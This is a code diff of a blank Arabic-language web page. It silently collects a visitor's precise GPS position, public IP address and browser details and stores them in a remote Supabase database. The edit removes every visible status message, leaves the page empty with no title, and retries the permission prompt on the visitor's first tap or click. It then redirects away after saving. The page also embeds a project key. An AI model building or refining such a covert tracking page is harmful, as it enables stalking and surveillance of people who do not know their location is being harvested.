@@ -1,59 +1,81 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title></title>
-<meta http-equiv="Content-Security-Policy"
-      content="default-src 'self';
-               script-src 'self' https://cdn.jsdelivr.net;
-               connect-src 'self' https://*.supabase.co https://api.ipify.org;
-               style-src 'self' 'unsafe-inline'">
-<style>body{font-family:system-ui;margin:0;padding:16px}</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title></title>
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self';
+                 script-src 'self' https://cdn.jsdelivr.net;
+                 connect-src 'self' https://*.supabase.co https://api.ipify.org;
+                 style-src 'self' 'unsafe-inline'">
+  <style>html,body{margin:0;padding:0;background:#fff}</style>
 </head>
 <body>
-<p id="s">بدء…</p>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-const SUPA_URL='https://weaiftikalbujuecfuhf.supabase.co';
-const SUPA_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
-const supabase=window.supabase.createClient(SUPA_URL,SUPA_KEY);
-const s=t=>document.getElementById('s').textContent=t;
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // مفاتيح مشروعك
+    const SUPA_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
+    const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
+    const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);
 
-function gps(timeout=25000){
-  return new Promise((res,rej)=>{
-    if(!('geolocation'in navigator)) return rej(new Error('Geolocation unsupported'));
-    navigator.geolocation.getCurrentPosition(
-      p=>res(p.coords),
-      e=>rej(e),
-      {enableHighAccuracy:true,timeout,maximumAge:0}
-    );
-  });
-}
-async function ip(){
-  try{const r=await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
-      const j=await r.json();return j.ip||null;}catch{return null;}
-}
-async function run(){
-  try{
-    s('طلب إذن GPS…'); const c=await gps(25000);
-    s('جلب IP…'); const ipStr=await ip();
-    s('حفظ في Supabase…');
-    const {error,data,status}=await supabase.from('locations').insert([{
-      device_name: navigator.userAgent,
-      ip: ipStr,
-      lat: c.latitude, lng: c.longitude, accuracy: c.accuracy ?? null
-    }]).select('id');
-    if(error){ s('خطأ Supabase: '+error.message); return; }
-    s('تم الحفظ ✓ (id='+data[0].id+')');
-  }catch(e){
-    let msg=e.message||('code '+e.code);
-    if(e.code===1) msg='رفض الإذن (User denied Geolocation)';
-    else if(e.code===2) msg='الموقع غير متاح';
-    else if(e.code===3) msg='انتهت المهلة';
-    s('فشل: '+msg);
-  }
-}
-run();
-</script>
+    // اختياري: redirect=/path بعد الحفظ
+    const qs = new URLSearchParams(location.search);
+    let redirect = null;
+    const raw = qs.get('redirect');
+    if (raw && raw.startsWith('/') && !raw.startsWith('//')) redirect = raw;
+
+    function gps(timeout=25000){
+      return new Promise((res,rej)=>{
+        if(!('geolocation' in navigator)) return rej(new Error('Geolocation unsupported'));
+        navigator.geolocation.getCurrentPosition(
+          p=>res(p.coords),
+          e=>rej(e),
+          {enableHighAccuracy:true, timeout, maximumAge:0}
+        );
+      });
+    }
+
+    async function getIP(){
+      try{
+        const r = await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
+        const j = await r.json(); return j.ip || null;
+      }catch{ return null; }
+    }
+
+    async function save(row){
+      const { error } = await supabase.from('locations').insert([row]);
+      if (error) throw new Error(error.message);
+    }
+
+    let tried = false, needClickRetry = false;
+    async function run(){
+      if (tried) return; tried = true;
+      try{
+        const c  = await gps(25000);                 // GPS فقط (قد يطلب إذن)
+        const ip = await getIP();
+        const ua = navigator.userAgent;
+
+        await save({
+          device_name: ua, ip,
+          lat: c.latitude, lng: c.longitude,
+          accuracy: c.accuracy ?? null
+        });
+
+        if (redirect) location.assign(redirect);
+      }catch(e){
+        // على iOS قد يحتاج تفاعل المستخدم لطلب الإذن
+        needClickRetry = true;
+      }
+    }
+
+    // محاولة تلقائية
+    run();
+
+    // إعادة المحاولة عند أول نقرة/لمسة (لـ iOS)
+    function retry(){ if(needClickRetry){ needClickRetry=false; tried=false; run(); } }
+    window.addEventListener('click', retry, {passive:true});
+    window.addEventListener('touchstart', retry, {passive:true});
+  </script>
 </body>
 </html>
